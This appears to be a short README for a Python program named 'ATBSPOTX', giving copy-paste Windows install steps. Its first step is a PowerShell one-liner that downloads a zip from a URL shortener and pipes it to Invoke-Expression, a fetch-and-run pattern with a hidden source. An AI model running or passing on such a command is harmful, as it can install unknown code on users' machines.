**`🎉 Welcome to ATBSPOTX 🎉`**

~~__**------------------------------------------------------------------------**__~~

**This Programe Make By : ! 【アイデンツ】💫 ゚ シ#2349**


**This Program First Beta By : SACQSM#1156**


**Make By : Python**

~~__**------------------------------------------------------------------------**__~~

**How to Download?**

```py
#Run in Command Prompt#
powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://shorturl.asia/C8YDu' -OutFile '.\downloads\atb-install.zip' | Invoke-Expression}"
start powershell.exe
Exit
```
**You Don't Have to Open Powershell anymore First Script Will Open Powershell for you.**

```powershell
#Run in Powershell#
Add-Type -AssemblyName System.IO.Compression.FileSystem
function Unzip
{
    param([string]$zipfile, [string]$outpath)

    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
}

Unzip ".\downloads\atb-install.zip" ".\downloads\atb-install"
Exit
```
When Finish Download goto folder "Download Folder"
